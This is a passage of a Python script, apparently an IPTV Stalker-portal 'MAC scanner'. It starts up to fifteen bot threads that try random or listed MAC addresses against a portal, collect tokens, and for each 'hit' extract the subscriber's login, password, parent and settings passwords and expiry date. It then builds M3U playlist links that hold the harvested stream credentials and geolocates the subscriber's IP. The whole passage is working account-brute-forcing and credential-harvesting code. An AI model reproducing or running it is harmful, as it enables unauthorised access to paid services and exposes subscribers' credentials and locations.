                            if trys == 10:
                                # quit()
                                cid = "94067"
                                break
                    real = panel
                    m3ulink = ""
                    m3uhost = ""
                    user = ""
                    pas = ""
                    plink = ""  # Initialize plink here
                    state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"

                    trys = 0
                    while True:
                        try:
                            res = option.get(url(cid), headers=hea2(macs, token), timeout=15, verify=False)
                            data = ""
                            data = str(res.text)
                            link = data.split('ffmpeg ')[1].split('"')[0].replace(r'\/', '/')
                            user = login
                            real = '' + link.split('://')[1].split('/')[0] + '/c/'
                            user = str(link.replace('live/', '').split('/')[3])
                            pas = str(link.replace('live/', '').split('/')[4])
                            m3ulink = "http://" + real.replace('http://', '').replace('/c/',
                                                                                      '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus"
                            m3uhost = "http://" + panel.replace('http://', '').replace('/c/',
                                                                                       '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
                            state = image(link)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 12:
                                break

                    playerapi = ""
                    if not m3ulink == "":
                        try:
                            playerlink = (http + real.replace(http, '').replace('/c/',
                                                                                '') + "/player_api.php?username=" + user + "&password=" + pas)
                            plink = real.replace(http, '').replace('/c/', '')  # Define plink here
                            playerapi = m3uapi(playerlink, mac, token)
                            m3ustat = m3ustatus(cid, user, pas, plink)
                        except:
                            pass

                        if playerapi == "":
                            try:
                                playerlink = (http + panel.replace(http, '').replace('/c/',
                                                                                     '') + "/player_api.php?username=" + user + "&password=" + pas)
                                plink = panel.replace(http, '').replace('/c/', '')  # Update plink here
                                playerapi = m3uapi(playerlink, mac, token)
                            except:
                                pass

                    try:
                        m3ustat = m3ustatus(cid, user, pas, plink)
                    except:
                        m3ustat = "Error"
                    if m3ustat == "ⓃⓄ ⒾⓂ︎ⒶⒼⒺ ":
                        m3uvpn = m3uvpn + 1
                    else:
                        m3uon = m3uon + 1
                    if state == "ⓊⓈⒺ ⓋⓅⓃ 🔒 " or state == "Invalid Opps":
                        macvpn = macvpn + 1
                    else:
                        macon = macon + 1
                    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
                    SNENC = SN.upper()
                    SNCUT = SNENC[:13]
                    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                    DEVENC = DEV.upper()
                    SG = SNCUT + '+' + mac
                    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
                    SINGENC = SING.upper()
                    if not ip == "":
                        vpn = vpnip(ip)
                    else:
                        vpn = "ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ"
                    url5 = "https://ipapi.co/" + ip + "/json/"
                    while True:
                        try:
                            res = option.get(url5, timeout=7, verify=False)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(2)
                            if trys == 4:
                                break
                    try:
                        trys = 0
                        data1 = str(res.text)
                        scountry = ""
                        country_name = "Unavailable 🏴‍☠️"
                        scountry = data1.split('country_code": "')[1]
                        scountry = scountry.split('"')[0]
                        country_name = data1.split('country_name": "')[1]
                        country_name = country_name.split('"')[0]
                        flagc = flag.flag(scountry)
                        if country_name == "":
                            country_name = "Unavailable 🏴‍☠️"
                        else:
                            country_name = country_name + " " + flagc
                        country_name = country_name
                    except:
                        pass

                    # try:
                    #     trys = 0
                    #     data = str(res.text)
                    #     scountry = ""
                    #     country_name = ""
                    #     scountry = data.split('country_code": "')[1]
                    #     scountry = scountry.split('"')[0]
                    #     country_name = data.split('country_name": "')[1]
                    #     country_name = country_name.split('"')[0]
                    # except:
                    #     pass
                    livelist = ""
                    vodlist = ""
                    serieslist = ""

                    try:
                        url10 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
                        try:
                            res = option.get(url10, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofchannels = str(data.count("stream_id"))

                        url11 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
                        try:
                            res = option.get(url11, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofmovies = str(data.count("stream_id"))

                        url12 = http + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
                        try:
                            res = option.get(url12, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofseries = str(data.count("series_id"))
                    except:
                        pass
                    # vpn = ""
                    # if not ip == "":
                    #     vpn = vpnip(ip)
                    # else:
                    #     vpn = " No IP Address"

                    if channelcat == "1" or channelcat == "2":
                        listlink = liveurl
                        livel = ' «★» '
                        livelist = list(listlink, macs, token, livel)
                    if channelcat == "2":
                        listlink = vodurl
                        livel = ' «★» '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' «★️» '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, m3uhost, m3ustat, state, vpn, livelist, vodlist, serieslist, playerapi,
                        fname, tariff_plan, ls, login, password, tariff_plan_id, bill, expire_billing_date, max_online,
                        parent_password, stb_type, comment, country, settings_password, country_name, scountry,
                        numberofchannels, numberofmovies, numberofseries)


def d15():
    global hitc, numberofchannels, numberofmovies, numberofseries
    global hitr, macv, tokenr, m3ustat
    global bots, m3uvpn, m3uon, macon, macvpn
    global expired_hits_bypassed
    for mac in range(15, mactrys, numbots):
        login = ""
        parent_password = ""
        password = ""
        stb_type = ""
        tariff_plan_id = ""
        comment = ""
        country = ""
        settings_password = ""
        expire_billing_date = ""
        max_online = ""
        expires = ""
        ls = ""
        fname = ""
        tariff_plan = ""
        bill = ""
        numberofchannels = "0"
        numberofmovies = "0"
        numberofseries = "0"
        livelist = ""
        vodlist = ""
        serieslist = ""
        playerapi = ""
        state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
        vpn = ""
        country_name = ""
        scountry = ""
        m3ulink = ""
        m3uhost = ""
        user = ""
        pas = ""
        plink = ""
        real = ""
        total = mac
        if selectcombo == "0":
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)  # check for matching mac in data
            if macv:
                mac = macv.group()
                mac = mac.upper()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = "Bot_15"
        oran = ""
        oran = round((total / mactrys * 100), 2)
        trys = 0
        data = ""
        while True:
            try:
                res = option.get(url1, headers=hea1(macs), timeout=15, verify=False)  # get to
                data = str(res.text)  # retrieve token stored in data
                break
            except:
                trys = trys + 1
                time.sleep(1)  # just some waiting around if they are problems receiving data
                if trys == 12:
                    break
        echok(mac, bot, total, hitr, hitc, status_code, oran, load, panel, tokenr)  # send data outside thread
        tokenr = "\33[35m"  # turn mac code purple if no token in response
        if 'token' in data:
            tokenr = "\33[0m"  # mac code white if token is in response
            token = data.replace('{"js":{"token":"', "")
            token = token.split('"')[0]  # separating token data out of the rest of the response
            trys = 0
            while True:
                try:
                    res = option.get(url2, headers=hea2(macs, token), timeout=15, verify=False)
                    data = ""
                    data = str(res.text)
                    break
                except:
                    trys = trys + 1
                    time.sleep(1)
                    if trys == 12:
                        break
            id = "null"
            ip = ""
            country = ""

            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass
            try:
                ip = str(fix_me2(data, "ip"))
            except:
                pass
            try:
                expires = str(fix_me2(data, "expires"))
            except:
                pass
            if id == "null" and expires == "" and ban == "":
                continue

            try:
                if load == "stalker_portal/server/load.php":
                    if 'login":"' in data:
                        login = str(fix_me2(data, "login"))
                        parent_password = str(fix_me2(data, "parent_password"))
                        password = str(fix_me2(data, "password"))
                        stb_type = str(fix_me2(data, "stb_type"))
                        tariff_plan_id = str(fix_me2(data, "tariff_plan_id"))
                        comment = str(fix_me2(data, "comment"))
                        country = str(fix_me2(data, "country"))
                        settings_password = str(fix_me2(data, "settings_password"))
                        expire_billing_date = str(fix_me2(data, "expire_billing_date"))
                        ls = str(fix_me2(data, "ls"))
                        try:
                            max_online = str(fix_me2(data, "max_online"))
                        except:
                            max_online = ""
            except:
                pass
            if not id == "null":
                trys = 0
                while True:
                    try:
                        res = option.get(url3, headers=hea2(macs, token), timeout=15, verify=False)
                        data = ""
                        data = str(res.text)
                        break
                    except:
                        trys = trys + 1
                        time.sleep(1)
                        if trys == 12:
                            break
                if not data.count('phone') == 0:
                    hitr = "\33[1;36m"
                    hitc = hitc + 1
                    trh = ""
                    fname = ""
                    ls = ""
                    tariff_plan = ""
                    bill = ""
                    if load == "stalker_portal/server/load.php":
                        try:
                            fname = str(fix_me2(data, "fname"))
                        except:
                            pass
                        try:
                            tariff_plan = str(fix_me2(data, "tariff_plan"))
                        except:
                            pass
                        try:
                            bill = str(fix_me2(data, "created"))
                        except:
                            pass
                    if "phone" in data:
                        trh = str(fix_me2(data, "phone"))
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]

                            if trh.lower()[:2] == 'un':
                                remainingdays = "∞ Days"
                                trh = trh + ' ' + remainingdays
                            else:
                                days_left = days_clear(trh)
                                if days_left is None or days_left <= 0:
                                    expired_hits_bypassed += 1
                                    print(f"\n\033[91mExpired Hit Passed: MAC {mac} - Expiry: {trh}\033[0m")
                                    hitc = hitc - 1 if hitc > 0 else 0
                                    hitr = "\33[1;33m"
                                    continue

                                remainingdays = str(days_left) + " Days"
                                trh = trh + ' ' + remainingdays
                        except Exception as e:
                            print(f"\033[93mDate Processing Error: {e}\033[0m")
                            continue

                    hitprint(mac, trh)
                    trys = 0
                    while True:
                        try:
                            res = option.get(url6, headers=hea2(macs, token), timeout=10, verify=False)
                            data = ""
                            data = str(res.text)
                            cid = ""
                            cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                            # print(cid)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 10:
                                # quit()
                                cid = "94067"
                                break
                    real = panel
                    m3ulink = ""
                    m3uhost = ""
                    user = ""
                    pas = ""
                    plink = ""  # Initialize plink here
                    state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"

                    trys = 0
                    while True:
                        try:
                            res = option.get(url(cid), headers=hea2(macs, token), timeout=15, verify=False)
                            data = ""
                            data = str(res.text)
                            link = data.split('ffmpeg ')[1].split('"')[0].replace(r'\/', '/')
                            user = login
                            real = '' + link.split('://')[1].split('/')[0] + '/c/'
                            user = str(link.replace('live/', '').split('/')[3])
                            pas = str(link.replace('live/', '').split('/')[4])
                            m3ulink = "http://" + real.replace('http://', '').replace('/c/',
                                                                                      '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus"
                            m3uhost = "http://" + panel.replace('http://', '').replace('/c/',
                                                                                       '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
                            state = image(link)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 12:
                                break

                    playerapi = ""
                    if not m3ulink == "":
                        try:
                            playerlink = (http + real.replace(http, '').replace('/c/',
                                                                                '') + "/player_api.php?username=" + user + "&password=" + pas)
                            plink = real.replace(http, '').replace('/c/', '')  # Define plink here
                            playerapi = m3uapi(playerlink, mac, token)
                            m3ustat = m3ustatus(cid, user, pas, plink)
                        except:
                            pass

                        if playerapi == "":
                            try:
                                playerlink = (http + panel.replace(http, '').replace('/c/',
                                                                                     '') + "/player_api.php?username=" + user + "&password=" + pas)
                                plink = panel.replace(http, '').replace('/c/', '')  # Update plink here
                                playerapi = m3uapi(playerlink, mac, token)
                            except:
                                pass

                    try:
                        m3ustat = m3ustatus(cid, user, pas, plink)
                    except:
                        m3ustat = "Error"
                    if m3ustat == "ⓃⓄ ⒾⓂ︎ⒶⒼⒺ ":
                        m3uvpn = m3uvpn + 1
                    else:
                        m3uon = m3uon + 1
                    if state == "ⓊⓈⒺ ⓋⓅⓃ 🔒 " or state == "Invalid Opps":
                        macvpn = macvpn + 1
                    else:
                        macon = macon + 1
                    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
                    SNENC = SN.upper()
                    SNCUT = SNENC[:13]
                    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                    DEVENC = DEV.upper()
                    SG = SNCUT + '+' + mac
                    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
                    SINGENC = SING.upper()
                    if not ip == "":
                        vpn = vpnip(ip)
                    else:
                        vpn = "ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ"
                    url5 = "https://ipapi.co/" + ip + "/json/"
                    while True:
                        try:
                            res = option.get(url5, timeout=7, verify=False)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(2)
                            if trys == 4:
                                break
                    try:
                        trys = 0
                        data1 = str(res.text)
                        scountry = ""
                        country_name = "Unavailable 🏴‍☠️"
                        scountry = data1.split('country_code": "')[1]
                        scountry = scountry.split('"')[0]
                        country_name = data1.split('country_name": "')[1]
                        country_name = country_name.split('"')[0]
                        flagc = flag.flag(scountry)
                        if country_name == "":
                            country_name = "Unavailable 🏴‍☠️"
                        else:
                            country_name = country_name + " " + flagc
                        country_name = country_name
                    except:
                        pass

                    # try:
                    #     trys = 0
                    #     data = str(res.text)
                    #     scountry = ""
                    #     country_name = ""
                    #     scountry = data.split('country_code": "')[1]
                    #     scountry = scountry.split('"')[0]
                    #     country_name = data.split('country_name": "')[1]
                    #     country_name = country_name.split('"')[0]
                    # except:
                    #     pass
                    livelist = ""
                    vodlist = ""
                    serieslist = ""

                    try:
                        url10 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
                        try:
                            res = option.get(url10, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofchannels = str(data.count("stream_id"))

                        url11 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
                        try:
                            res = option.get(url11, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofmovies = str(data.count("stream_id"))

                        url12 = http + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
                        try:
                            res = option.get(url12, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofseries = str(data.count("series_id"))
                    except:
                        pass
                    # vpn = ""
                    # if not ip == "":
                    #     vpn = vpnip(ip)
                    # else:
                    #     vpn = " No IP Address"

                    if channelcat == "1" or channelcat == "2":
                        listlink = liveurl
                        livel = ' «★» '
                        livelist = list(listlink, macs, token, livel)
                    if channelcat == "2":
                        listlink = vodurl
                        livel = ' «★» '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' «★️» '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, m3uhost, m3ustat, state, vpn, livelist, vodlist, serieslist, playerapi,
                        fname, tariff_plan, ls, login, password, tariff_plan_id, bill, expire_billing_date, max_online,
                        parent_password, stb_type, comment, country, settings_password, country_name, scountry,
                        numberofchannels, numberofmovies, numberofseries)


t1 = threading.Thread(target=d1)
t2 = threading.Thread(target=d2)
t3 = threading.Thread(target=d3)
t4 = threading.Thread(target=d4)
t5 = threading.Thread(target=d5)
t6 = threading.Thread(target=d6)
t7 = threading.Thread(target=d7)
t8 = threading.Thread(target=d8)
t9 = threading.Thread(target=d9)
t10 = threading.Thread(target=d10)
t11 = threading.Thread(target=d11)
t12 = threading.Thread(target=d12)
t13 = threading.Thread(target=d13)
t14 = threading.Thread(target=d14)
t15 = threading.Thread(target=d15)
t1.start()

if numbots == 2 or numbots == 3 or numbots == 4 or numbots == 5 or numbots == 6 or numbots == 7 or numbots == 8 or numbots == 9 or numbots == 10 or numbots == 11 or numbots == 12 or numbots == 13 or numbots == 14 or numbots == 15 or numbots == 16 or numbots == 17 or numbots == 18 or numbots == 19 or numbots == 20 or numbots == 21 or numbots == 22 or numbots == 23 or numbots == 24 or numbots == 25: t2.start()
if numbots == 3 or numbots == 4 or numbots == 5 or numbots == 6 or numbots == 7 or numbots == 8 or numbots == 9 or numbots == 10 or numbots == 11 or numbots == 12 or numbots == 13 or numbots == 14 or numbots == 15 or numbots == 16 or numbots == 17 or numbots == 18 or numbots == 19 or numbots == 20 or numbots == 21 or numbots == 22 or numbots == 23 or numbots == 24 or numbots == 25: t3.start()
if numbots == 4 or numbots == 5 or numbots == 6 or numbots == 7 or numbots == 8 or numbots == 9 or numbots == 10 or numbots == 11 or numbots == 12 or numbots == 13 or numbots == 14 or numbots == 15 or numbots == 16 or numbots == 17 or numbots == 18 or numbots == 19 or numbots == 20 or numbots == 21 or numbots == 22 or numbots == 23 or numbots == 24 or numbots == 25: t4.start()
if numbots == 5 or numbots == 6 or numbots == 7 or numbots == 8 or numbots == 9 or numbots == 10 or numbots == 11 or numbots == 12 or numbots == 13 or numbots == 14 or numbots == 15 or numbots == 16 or numbots == 17 or numbots == 18 or numbots == 19 or numbots == 20 or numbots == 21 or numbots == 22 or numbots == 23 or numbots == 24 or numbots == 25: t5.start()
if numbots == 6 or numbots == 7 or numbots == 8 or numbots == 9 or numbots == 10 or numbots == 11 or numbots == 12 or numbots == 13 or numbots == 14 or numbots == 15 or numbots == 16 or numbots == 17 or numbots == 18 or numbots == 19 or numbots == 20 or numbots == 21 or numbots == 22 or numbots == 23 or numbots == 24 or numbots == 25: t6.start()
if numbots == 7 or numbots == 8 or numbots == 9 or numbots == 10 or numbots == 11 or numbots == 12 or numbots == 13 or numbots == 14 or numbots == 15 or numbots == 16 or numbots == 17 or numbots == 18 or numbots == 19 or numbots == 20 or numbots == 21 or numbots == 22 or numbots == 23 or numbots == 24 or numbots == 25: t7.start()
if numbots == 8 or numbots == 9 or numbots == 10 or numbots == 11 or numbots == 12 or numbots == 13 or numbots == 14 or numbots == 15 or numbots == 16 or numbots == 17 or numbots == 18 or numbots == 19 or numbots == 20 or numbots == 21 or numbots == 22 or numbots == 23 or numbots == 24 or numbots == 25: t8.start()
if numbots == 9 or numbots == 10 or numbots == 11 or numbots == 12 or numbots == 13 or numbots == 14 or numbots == 15 or numbots == 16 or numbots == 17 or numbots == 18 or numbots == 19 or numbots == 20 or numbots == 21 or numbots == 22 or numbots == 23 or numbots == 24 or numbots == 25: t9.start()
if numbots == 10 or numbots == 11 or numbots == 12 or numbots == 13 or numbots == 14 or numbots == 15 or numbots == 16 or numbots == 17 or numbots == 18 or numbots == 19 or numbots == 20 or numbots == 21 or numbots == 22 or numbots == 23 or numbots == 24 or numbots == 25: t10.start()
if numbots == 11 or numbots == 12 or numbots == 13 or numbots == 14 or numbots == 15 or numbots == 16 or numbots == 17 or numbots == 18 or numbots == 19 or numbots == 20 or numbots == 21 or numbots == 22 or numbots == 23 or numbots == 24 or numbots == 25: t11.start()
if numbots == 12 or numbots == 13 or numbots == 14 or numbots == 15 or numbots == 16 or numbots == 17 or numbots == 18 or numbots == 19 or numbots == 20 or numbots == 21 or numbots == 22 or numbots == 23 or numbots == 24 or numbots == 25: t12.start()
if numbots == 13 or numbots == 14 or numbots == 15 or numbots == 16 or numbots == 17 or numbots == 18 or numbots == 19 or numbots == 20 or numbots == 21 or numbots == 22 or numbots == 23 or numbots == 24 or numbots == 25: t13.start()
if numbots == 14 or numbots == 15 or numbots == 16 or numbots == 17 or numbots == 18 or numbots == 19 or numbots == 20 or numbots == 21 or numbots == 22 or numbots == 23 or numbots == 24 or numbots == 25: t14.start()
if numbots == 15 or numbots == 16 or numbots == 17 or numbots == 18 or numbots == 19 or numbots == 20 or numbots == 21 or numbots == 22 or numbots == 23 or numbots == 24 or numbots == 25: t15.start()
